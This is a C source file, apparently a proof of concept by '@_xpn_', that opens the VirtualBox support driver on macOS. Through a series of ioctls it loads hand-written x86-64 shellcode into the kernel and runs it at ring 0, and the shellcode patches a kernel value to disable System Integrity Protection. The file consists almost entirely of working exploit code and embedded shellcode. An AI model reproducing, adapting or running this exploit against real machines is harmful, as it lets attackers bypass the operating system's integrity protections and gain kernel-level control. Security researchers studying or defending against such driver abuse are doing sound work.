/*
 * clang -o vboxloader vboxloader.c -framework IOKit
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <IOKit/IOKitLib.h>
#include "vboxloader.h"

io_connect_t open_service(const char *name) {
    CFMutableDictionaryRef dict;
    io_service_t service;
    io_connect_t connect;
    kern_return_t result;
    mach_port_t masterPort;
    io_iterator_t iter;
 
    if ((dict = IOServiceMatching(name)) == NULL) {
        printf("[!] IOServiceMatching call failed\n");
        return -1;
    }
    
    if ((result = IOMasterPort(MACH_PORT_NULL, &masterPort)) != KERN_SUCCESS) {
        printf("[!] IOMasterPort Call Failed\n");
        return -1;
    }
    
    if ((result = IOServiceGetMatchingServices(masterPort, dict, &iter)) != KERN_SUCCESS) {
        printf("[!] IOServiceGetMatchingServices call failed\n");
        return -1;
    }
    
    service = IOIteratorNext(iter);
    
    if ((result = IOServiceOpen(service, mach_task_self(), SUP_DARWIN_IOSERVICE_COOKIE, &connect)) != KERN_SUCCESS) {
        printf("[!] IOServiceOpen failed %s\n", name);
        return -1;
    }
    return connect;
}

int close_service(io_connect_t connect) {
    kern_return_t kr = IOServiceClose(connect);
    if (kr != kIOReturnSuccess) {
        printf("[!] IOServiceClose failed\n");
        return -1;
    }
    return 0;    
}

int main() {
    //char shellcode[] = "\xcc" // set breakpoint for debugging
    char shellcode[] = "\x53\x48\x8B\x45\x00\x48\x8B\x00\x48\x8B\x00\x48\x8B\x40\x08\x48\xBB\xB1\x6E\x4D\x00\x80\xFF\xFF\xFF\x48\x29\xD8\x48\xBB\x48\xD2\xC1\x00\x80\xFF\xFF\xFF\x48\x01\xD8\x48\x8B\x00\xC6\x80\x98\x04\x00\x00\x67\xB8\x02\x00\x00\x00\x5B\xC3";
    
    SUPCOOKIE cookie;
    SUPLDROPEN ldropen;
    SUPLDRLOAD *ldr = (SUPLDRLOAD *)malloc(9999);
    char d;
    int result;
    
    printf("@_xpn_ - VirtualBox Ring0 Exec - SIP Bypass POC\n\n");
    
    printf("[*] Ready...\n");
    io_connect_t conn = open_service("org_virtualbox_SupDrv");
    if (conn < 0) {
        return 2;
    }
    
    printf("[*] Steady...\n");
    
    int fd = open("/dev/vboxdrv", O_RDWR);
    if (fd < 0) {
        printf("[*] Fail... could not open /dev/vboxdrv\n");
        return 2;
    }
    
    memset(&cookie, 0, sizeof(SUPCOOKIE));
    cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
    cookie.Hdr.u32SessionCookie = 0x41424345;
    cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
    cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
    cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    cookie.u.In.u32ReqVersion = SUPDRV_IOC_VERSION;
    strcpy(cookie.u.In.szMagic, SUPCOOKIE_MAGIC);
    cookie.u.In.u32MinVersion = 0x290001;
    cookie.Hdr.rc = VERR_INTERNAL_ERROR;
    if ((result = ioctl(fd, SUP_IOCTL_COOKIE, &cookie)) < 0) {
        printf("[*] Fail... call to SUP_IOCTL_COOKIE returned an error\n");
        return 2;
    }
    
    memset(&ldropen, 0, sizeof(SUPLDROPEN));
    ldropen.Hdr.u32Cookie = cookie.u.Out.u32Cookie;
    ldropen.Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
    ldropen.Hdr.cbIn = sizeof(SUPLDROPEN);
    ldropen.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    ldropen.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
    ldropen.u.In.cbImageWithTabs = 100;
    ldropen.u.In.cbImageBits = 80;
    strcpy(ldropen.u.In.szFilename, "/tmp/ignored");
    strncpy(ldropen.u.In.szName, "XPN", 3);
    if ((result = ioctl(fd, SUP_IOCTL_LDR_OPEN, &ldropen)) < 0) {
        printf("[*] Fail... call to SUP_IOCTL_LDR_OPEN returned an error\n");
        return 2;
    }
    
    printf("DEBUG: Place breakpoint on 0x%08llx\n", ldropen.u.Out.pvImageBase);
    scanf("%c", &d);
    
    memset(ldr, 0x0, 9999);
    memcpy(ldr->u.In.abImage, shellcode, sizeof(shellcode));
    ldr->Hdr.u32Cookie = cookie.u.Out.u32Cookie;
    ldr->Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
    ldr->Hdr.cbIn = SUP_IOCTL_LDR_LOAD_SIZE_IN(100);
    ldr->Hdr.cbOut = 2080;
    ldr->Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    ldr->u.In.cbImageWithTabs = 100;
    ldr->u.In.cbImageBits = 80;
    ldr->u.In.pvImageBase = ldropen.u.Out.pvImageBase;
    ldr->u.In.pfnModuleInit = ldropen.u.Out.pvImageBase;
    if ((result = ioctl(fd, SUP_IOCTL_LDR_LOAD, ldr)) < 0) {
        printf("[*] Fail... call to SUP_IOCTL_LDR_LOAD returned an error\n");
        return 2;
    }

    printf("[*] SIP Disabled!\n\n");    
    
    close(fd);
    close_service(conn);
    return 0;
}
